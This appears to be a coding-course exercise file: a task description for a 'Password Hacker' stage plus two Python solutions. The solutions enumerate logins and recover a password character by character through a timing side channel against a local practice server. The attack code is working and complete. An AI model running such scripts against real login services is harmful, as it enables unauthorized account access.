'''
Description
Your program has successfully hacked the new system! However, you've been spotted: the admin noticed your first failed attempts, found the vulnerability and made a patch. You should overcome this patch and hack the system again. It’s not easy being a hacker!

The admin has improved the server: the program now catches the exception and sends a simple ‘wrong password’ message to the client even when the real password starts with current symbols.

But here's the thing: the admin probably just caught this exception. We know that catching an exception takes the computer a long time, so there should be a delay in the server response when this exception takes place. You can use it to hack the system: count the time period in which the response comes and find out which starting symbols work out for the password.

Objectives
In this stage, you should write a program that uses the time vulnerability to find the password.

Use the list of logins from the previous stage.
Output the result as you did this in the previous stage.
Examples
The greater-than symbol followed by a space (> ) represents the user input. Note that it's not part of the input.

Example 1:

> python hack.py localhost 9090
{
    "login" : "su",
    "password" : "fTUe3O99Rre"
}
Example 2:

> python hack.py localhost 9090
{"login": "admin3", "password": "mlqDz33x"}
'''


import sys
from time import time
from argparse import ArgumentParser
from socket import socket
from json import dumps, loads
from string import ascii_lowercase, ascii_uppercase

arg_parse = ArgumentParser()
arg_parse.add_argument('ip')
arg_parse.add_argument('port')
args = arg_parse.parse_args()
address = (args.ip, int(args.port))

with socket() as client:
    client.connect(address)
    with open(r'C:\Users\陆明\PycharmProjects\Password Hacker\Password Hacker\task\hacking\logins.txt', "r") as file:
        for login in file.readlines():
            login = login.rstrip()
            data = {"login": login, "password": " "}
            client.send(dumps(data).encode())
            response = loads(client.recv(1024).decode())
            if response['result'] == "Wrong password!":
                break

    chars = ascii_lowercase + ascii_uppercase + "0123456789"
    password = ""
    while True:
        for char in chars:
            data = {"login": login, "password": password + char}
            start_time = time()
            client.send(dumps(data).encode())
            response = loads(client.recv(1024).decode())
            end_time = time()
            if end_time - start_time > 0.1:
                password += char
                break
            elif response['result'] == "Connection success!":
                print(dumps(data))
                sys.exit()
                
                
\\

# write your code here
import argparse
import os
import socket
import string
import sys
import json
import time


def get_result(socket_, login_, password_):
    log_pass_pair = {"login": login_, "password": password_}
    request = json.dumps(log_pass_pair)
    socket_.send(request.encode())
    answer = json.loads(socket_.recv(1024).decode())
    return answer["result"]


def check_password(socket_, login_: str, password_: str):
    chars_list = string.ascii_lowercase + string.ascii_uppercase + string.digits
    n = 1

    for char in chars_list:
        start_time = time.perf_counter()
        result = get_result(socket_, login_, str(password_) + str(char))
        end_time = time.perf_counter()
        if result == "Wrong password!" and (end_time - start_time) >= 0.0009:
            return check_password(socket_, login_, password_ + char)
        elif result == "Connection success!":
            return password_ + char


parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port")
arguments = parser.parse_args()

with socket.socket() as connection, open(os.path.join(sys.path[0], "logins.txt"), 'r') as logins_list:
    host = arguments.host
    port = int(arguments.port)
    connection.connect((host, port))
    log_pass_dict = {"login": " ", "password": " "}
    while True:
        login = logins_list.readline().strip()
        if get_result(connection, login, log_pass_dict["password"]) == "Wrong password!":
            log_pass_dict["login"] = login
            break

    log_pass_dict["password"] = check_password(connection, log_pass_dict["login"], "")

print(json.dumps(log_pass_dict))